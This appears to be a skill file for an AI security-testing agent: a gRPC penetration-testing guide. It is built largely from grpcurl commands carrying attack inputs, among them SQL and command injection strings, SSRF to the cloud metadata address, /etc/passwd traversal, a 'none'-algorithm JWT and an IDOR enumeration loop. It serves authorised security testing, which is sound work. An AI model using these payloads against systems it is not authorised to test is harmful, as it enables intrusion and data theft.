---
name: grpc-testing
description: gRPC security testing — injection, auth bypass, reflection abuse, and fuzzing protobuf endpoints
---

# gRPC Security Testing

gRPC uses HTTP/2 and Protocol Buffers (protobuf) and presents a different attack surface from REST APIs. Authentication, input validation, and authorization bugs exist in gRPC services just as in REST, but standard web proxies and tools need special setup to interact with binary-encoded messages.

## Attack Surface

**Transport**
- gRPC over HTTP/2 (TLS and plaintext `h2c`)
- gRPC-Web (HTTP/1.1 compatible variant, typically via proxy)
- gRPC-Gateway (REST→gRPC proxy, creates additional attack surface)

**Service Discovery**
- gRPC Server Reflection (exposes all service definitions at runtime)
- `.proto` files in public repositories
- Error messages revealing method/service names

**Common Ports**
- 443 (TLS), 80 (plaintext), 50051 (default gRPC), 8080, 9090

## Tools Setup

```bash
# grpcurl — like curl for gRPC
grpcurl -plaintext localhost:50051 list  # List services
grpcurl -plaintext localhost:50051 list mypackage.MyService  # List methods
grpcurl -plaintext localhost:50051 describe mypackage.MyService.MyMethod  # Method details
grpcurl -plaintext -d '{"field":"value"}' localhost:50051 mypackage.MyService/MyMethod

# grpcui — web UI for gRPC (Burp-friendly)
grpcui -plaintext localhost:50051
# Opens browser UI at localhost:PORT, proxy through Burp

# Burp Suite
# Enable HTTP/2 in Proxy settings
# Use Burp's built-in gRPC support or grpcui as intermediary

# Evans — interactive gRPC client
evans --host localhost --port 50051 --proto service.proto repl

# Postman — supports gRPC natively (import .proto or reflection)
```

## Key Vulnerabilities

### gRPC Reflection Abuse

Server reflection exposes service definitions without .proto files:
```bash
# List all services
grpcurl -plaintext target:50051 list

# Describe a service
grpcurl -plaintext target:50051 describe helloworld.Greeter

# Get full schema
grpcurl -plaintext target:50051 describe .
```

**Security implication**: Reflection in production gives attackers full API map without any auth.

### Authentication Bypass

```bash
# Test without any auth
grpcurl -plaintext -d '{"user_id":"admin"}' target:50051 user.UserService/GetUser

# Test with empty/invalid metadata
grpcurl -plaintext -H "authorization: " -d '{"user_id":"1"}' target:50051 svc/Method

# Test with JWT algorithm none
grpcurl -plaintext -H "authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.PAYLOAD." ...

# Test metadata injection
grpcurl -plaintext -H "x-admin: true" -d '{}' target:50051 admin.AdminService/ListUsers
```

### Injection via Protobuf Fields

```bash
# SQL injection in string fields
grpcurl -plaintext -d '{"email":"admin@x.com'"'"' OR 1=1--","password":"x"}' \
  target:50051 auth.AuthService/Login

# Command injection
grpcurl -plaintext -d '{"filename":"test; id #"}' target:50051 file.FileService/ReadFile

# SSRF via URL fields
grpcurl -plaintext -d '{"url":"http://169.254.169.254/latest/meta-data/"}' \
  target:50051 fetch.FetchService/FetchURL

# Template injection
grpcurl -plaintext -d '{"template":"{{7*7}}"}' target:50051 report.ReportService/Generate
```

### IDOR in gRPC

```bash
# Access other users' data
grpcurl -plaintext -H "authorization: Bearer OWN_TOKEN" \
  -d '{"user_id":"VICTIM_ID"}' target:50051 user.UserService/GetProfile

# Enumerate IDs
for i in {1..100}; do
  grpcurl -plaintext -d "{\"id\":$i}" target:50051 svc.Service/GetResource 2>/dev/null
done
```

### gRPC-Gateway (REST→gRPC) Attacks

gRPC-Gateway translates HTTP REST to gRPC. The REST layer may have mismatches:
```
# REST endpoint:
GET /v1/users/{id}

# May map to gRPC:
UserService.GetUser({user_id: id})

# Test HTTP verb confusion, parameter injection at REST layer
PUT /v1/users/VICTIM_ID  # May bypass gRPC-level auth
POST /v1/admin  # REST gateway may expose unlisted gRPC methods
```

### Streaming Abuse

```bash
# Server streaming — enumerate via single request
grpcurl -plaintext -d '{"page_size": 999999}' target:50051 data.DataService/ListAll

# Bidirectional streaming — connection hijacking
# Test if stream context carries auth properly when switching users mid-stream
```

### Unary gRPC Flooding / Slow Loris

```bash
# Resource exhaustion via max concurrent streams
# HTTP/2 streams: default max 100 concurrent
# Open many streams without completing them
```

## Protobuf Fuzzing

```bash
# Protobuf encoding — test with invalid field types
# Field 1, wire type 0 (varint): 0x08
# Field 1, wire type 2 (length-delimited): 0x0a
# Send malformed protobuf to trigger parsing errors

# Using radamsa for mutation
echo '{"user_id":"test"}' | grpcurl -plaintext -d @ target:50051 svc/Method | \
  radamsa | grpcurl -plaintext -d @ target:50051 svc/Method

# Protobuf field overflow
grpcurl -plaintext -d '{"value": -9999999999999}' target:50051 svc/Method
grpcurl -plaintext -d '{"name": "'$(python3 -c "print('A'*100000)")'"}' target:50051 svc/Method
```

## Error Message Exploitation

```bash
# gRPC errors often include stack traces in development
grpcurl -plaintext -d '{}' target:50051 svc/Method
# Look for: file paths, framework versions, internal service names, SQL queries in errors

# Trigger different error types
grpcurl -plaintext -d '{"id": "../../etc/passwd"}' target:50051 svc/Method
grpcurl -plaintext -d '{"sql": "'"'"' OR 1=1"}' target:50051 svc/Method
```

## Testing Methodology

1. **Discover endpoints** — Reflection API, .proto files in repos, Shodan/Censys for gRPC ports
2. **Enumerate services** — `grpcurl list` and `describe` all services/methods
3. **Test authentication** — Try all methods without auth, with invalid tokens, with metadata injection
4. **Test authorization** — Access other users' resources with own token
5. **Inject in string fields** — SQLi, CMDi, SSRF, SSTI via all string parameters
6. **Test streaming** — Server/client/bidirectional streaming for auth and injection
7. **Test gRPC-Web and REST gateway** — Different code paths, potential bypasses
8. **Fuzz protobuf** — Invalid types, overflow values, missing required fields

## Validation

1. Show grpcurl command that achieves the bypass/injection
2. Include request/response with evidence of vulnerability
3. For auth bypass: show response with another user's data
4. For injection: show error revealing query or OOB callback

## False Positives

- Reflection disabled in production (method not found error)
- Proper TLS mutual auth (mTLS) preventing unauthenticated connections
- Input properly sanitized before use in queries/commands

## Impact

- IDOR: cross-user data access in microservices
- Auth bypass: access to administrative gRPC methods
- Injection: full exploitation chain (SQLi, RCE, SSRF) through protobuf fields
- Schema disclosure: complete API blueprint for targeted attacks

## Pro Tips

1. Always try reflection first — many prod services forget to disable it
2. `grpcui` makes testing much easier — run it locally and proxy through Burp
3. gRPC-Gateway REST endpoints often have weaker auth than native gRPC
4. Protobuf field numbers are stable across versions — old .proto files still work
5. Check for gRPC health check endpoint: `grpc.health.v1.Health/Check`
6. gRPC metadata (headers) is the equivalent of HTTP headers — test all auth bypass techniques
7. Internal gRPC services often have no auth — find them via SSRF or network access
8. Error status codes reveal info: `PERMISSION_DENIED` vs `NOT_FOUND` for IDOR enumeration

## Summary

gRPC's binary protocol and HTTP/2 transport require different tools but the same attack mindset. Server reflection gives you the full API map for free. Test authentication, authorization, and injection across all methods. Use grpcui for Burp-compatible interactive testing.
